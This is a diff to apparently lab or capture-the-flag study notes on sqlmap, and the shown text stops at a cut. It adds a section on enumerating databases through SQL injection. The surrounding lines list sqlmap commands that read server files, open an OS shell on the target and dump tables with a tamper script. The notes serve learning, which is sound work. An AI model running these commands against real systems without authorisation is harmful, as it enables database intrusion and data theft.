@@ -128,3 +128,21 @@ Commands as per Risk and Levels :
 14. `sqlmap -r OsExploit.txt --file-read "/var/www/html/flag.txt" --batch --threads 10`
 15. `sqlmap -r OsExploit.txt --os-shell --threads 10 --batch`
 16. `sqlmap -r Add-To-Cart.txt --threads 10 --tamper=between -T final_flag --dump --batch`
+
+## Database Enumeration
+If a user wants to retrieve the "banner" (switch `--banner`) for the target based on MySQL DBMS, the `VERSION()` query will be used for such purpose.  
+
+In case of retrieval of the current user name (switch `--current-user`), the `CURRENT_USER()` query will be used.
+
+Enumeration usually starts with the retrieval of the basic information:
+
+- Database version banner (switch `--banner`)
+- Current user name (switch `--current-user`)
+- Current database name (switch `--current-db`)
+- Checking if the current user has DBA (administrator) rights (switch `--is-dba`)
+
+```shell-session
+sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+```
+
+This command w
